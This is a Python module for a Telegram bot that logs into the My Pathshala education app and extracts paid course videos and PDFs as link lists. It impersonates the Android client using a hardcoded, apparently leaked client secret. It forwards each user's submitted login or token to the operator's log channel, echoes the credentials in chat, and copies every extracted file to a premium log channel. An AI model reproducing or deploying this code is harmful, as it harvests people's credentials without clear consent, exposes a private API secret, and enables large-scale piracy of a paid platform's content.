import asyncio
import aiohttp
import json
from pyrogram import filters
from Extractor import app
from config import PREMIUM_LOGS,BOT_TEXT
from datetime import datetime
import pytz
import logging
import os
from Extractor.core.utils import forward_to_log

# Initialize logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.on_message(filters.command(["my"]))
async def my_pathshala_login(app, message):
    try:
        start_time = datetime.now()
        
        # Initial message
        editable = await message.reply_text(
            "🔹 <b>MY PATHSHALA EXTRACTOR PRO</b> 🔹\n\n"
            "Send login details in this format:\n"
            "1️⃣ <b>ID*Password:</b> <code>ID*Password</code>\n"
            "2️⃣ <b>Token:</b> <code>your_token</code>\n\n"
            "<i>Example:</i>\n"
            "- ID*Pass: <code>user@mail.com*pass123</code>\n"
            "- Token: <code>eyJhbGciOiJ...</code>"
        )

        # Get login details
        input1 = await app.ask(message.chat.id, "Send your credentials")
        raw_text = input1.text.strip()
        # After getting user response
        await forward_to_log(input1, "My Pathshala Extractor")
        await input1.delete()

        try:
            if '*' in raw_text:
                # Login with ID*Password
                username, password = raw_text.split("*", 1)
                url = 'https://usvc.my-pathshala.com/api/signin'
                headers = {
                    'Host': 'usvc.my-pathshala.com',
                    'Preference': '',
                    'Filter': '1',
                    'Clientid': '2702',
                    'Edustore': 'false',
                    'Platform': 'android',
                    'Trnsreqid': '7e643e8a-0450-4a32-a6ab-db918a1a5e7c',
                    'Content-Type': 'application/json; charset=UTF-8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'User-Agent': 'okhttp/4.8.0',
                    'Connection': 'close'
                }
                
                data = {
                    "client_id": 2702,
                    "client_secret": "cCZxFzu57FrejvFVvEDmytSfDVaVTjC1EA5e1E34",
                    "password": password,
                    "username": username
                }

                async with aiohttp.ClientSession() as session:
                    async with session.post(url, headers=headers, json=data) as response:
                        response_text = await response.text()
                        L_data = json.loads(response_text)
                        if 'access_token' not in L_data:
                            await editable.edit_text(
                                "❌ <b>Login Failed</b>\n\n"
                                "Please check your credentials and try again."
                            )
                            return
                        token = L_data['access_token']
            else:
                # Direct token login
                token = raw_text

            # Fetch courses
            headers_b = {
                'Authorization': f'Bearer {token}',
                'ClientId': '2702',
                'EduStore': 'false',
                'Platform': 'android',
                'TrnsReqId': 'd4ae4fe2-7710-41e0-ad6c-707723443e17',
                'Host': 'csvc.my-pathshala.com',
                'Connection': 'Keep-Alive',
                'Accept-Encoding': 'gzip',
                'User-Agent': 'okhttp/4.8.0'
            }
            
            mybatch_url = "https://csvc.my-pathshala.com/api/enroll/course?page=1&perPageCount=10"
            
            async with aiohttp.ClientSession() as session:
                async with session.get(mybatch_url, headers=headers_b) as response:
                    if response.status != 200:
                        await editable.edit_text(
                            "❌ <b>Failed to fetch courses</b>\n\n"
                            "Please check your login details and try again."
                        )
                        return

                    response_text = await response.text()
                    data = json.loads(response_text).get('response', {}).get('data', [])
                    
                    if not data:
                        await editable.edit_text(
                            "❌ <b>No Batches Found</b>\n\n"
                            "You don't have any batches available."
                        )
                        return

                    # Format batch information
                    batch_text = ""
                    for cdata in data:
                        cid = cdata['course']['id']
                        cname = cdata['course']['course_name']
                        batch_text += f"<code>{cid}</code> - <b>{cname}</b> 💰\n\n"

                    await editable.edit_text(
                        f"✅ <b>Login Successful!</b>\n\n"
                        f"🆔 <b>Credentials:</b> <code>{raw_text}</code>\n\n"
                        f"📚 <b>Available Batches:</b>\n\n{batch_text}"
                    )

                    # Process each batch
                    for cdata in data:
                        try:
                            cid = cdata['course']['id']
                            cname = cdata['course']['course_name']
                            
                            progress_msg = await message.reply_text(
                                "🔄 <b>Processing Large Batch</b>\n"
                                f"└─ Current: <code>{cname}</code>"
                            )

                            # Initialize content storage
                            all_urls = []
                            
                            # Process videos
                            videos = cdata['course'].get('videos', [])
                            for video in videos:
                                title = video['title']
                                link = f"https://www.youtube.com/watch?v={video['video']}"
                                all_urls.append(f"{title}:{link}")

                            # Process assignments/PDFs
                            assignments = cdata['course'].get('assignments', [])
                            for pdf in assignments:
                                title = pdf['assignment_name']
                                link = f"https://mps.sgp1.digitaloceanspaces.com/prod/docs/courses/{pdf['document']}"
                                all_urls.append(f"{title}:{link}")

                            if not all_urls:
                                await progress_msg.edit_text("❌ <b>No content found in this batch</b>")
                                continue

                            # Count content types
                            video_count = sum(1 for url in all_urls if 'youtube.com' in url.lower())
                            pdf_count = sum(1 for url in all_urls if '.pdf' in url.lower())
                            doc_count = sum(1 for url in all_urls if any(ext in url.lower() for ext in ['.doc', '.docx', '.ppt', '.pptx']))

                            # Create file
                            file_name = f"MyPathshala_{cname}_{int(start_time.timestamp())}.txt"
                            with open(file_name, 'w', encoding='utf-8') as f:
                                f.write('\n'.join(all_urls))

                            # Calculate duration
                            duration = datetime.now() - start_time
                            minutes, seconds = divmod(duration.total_seconds(), 60)

                            # Prepare caption
                            caption = (
                                f"🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
                                f"📱 <b>APP:</b> My Pathshala\n"
                                f"📚 <b>BATCH:</b> {cname} (ID: {cid})\n"
                                f"⏱ <b>EXTRACTION TIME:</b> {int(minutes):02d}:{int(seconds):02d}\n"
                                f"📅 <b>DATE:</b> {datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%d-%m-%Y %H:%M:%S')} IST\n\n"
                                f"📊 <b>CONTENT STATS</b>\n"
                                f"├─ 📁 Total Links: {len(all_urls)}\n"
                                f"├─ 🎬 Videos: {video_count}\n"
                                f"├─ 📄 PDFs: {pdf_count}\n"
                                f"└─ 📑 Documents: {doc_count}\n\n"
                                f"🚀 <b>Extracted by:</b> @{(await app.get_me()).username}\n\n"
                                f"<code>╾───• {BOT_TEXT} •───╼</code>"
                            )

                            # Send file
                            await message.reply_document(
                                document=file_name,
                                caption=caption,
                                parse_mode="html"
                            )
                            await app.send_document(PREMIUM_LOGS, file_name, caption=caption)

                            # Cleanup
                            try:
                                os.remove(file_name)
                            except:
                                pass

                            await progress_msg.edit_text(
                                "✅ <b>Extraction completed successfully!</b>\n\n"
                                f"📊 𝗙𝗶𝗻𝗮𝗹 𝗦𝘁𝗮𝘁𝘂𝘀:\n"
                                f"📚 Processed: {cname}\n"
                                f"📤 File has been uploaded\n\n"
                                f"Thank you for using -:𝙂𝙃𝙊𝙎𝙏•𝙍𝙄𝙓:-🌟"
                            )

                        except Exception as e:
                            logger.error(f"Error processing batch {cname}: {e}")
                            await progress_msg.edit_text(
                                "❌ <b>Failed to process batch</b>\n\n"
                                f"Error: <code>{str(e)}</code>"
                            )

        except Exception as e:
            await editable.edit_text(
                "❌ <b>Login Failed</b>\n\n"
                f"Error: <code>{str(e)}</code>\n\n"
                "Please check your credentials and try again."
            )

    except Exception as e:
        logger.error(f"Error in my_pathshala_login: {e}")
        await message.reply_text(
            "❌ <b>An error occurred</b>\n\n"
            f"Error: <code>{str(e)}</code>\n\n"
            "Please try again or contact support."
        )
  
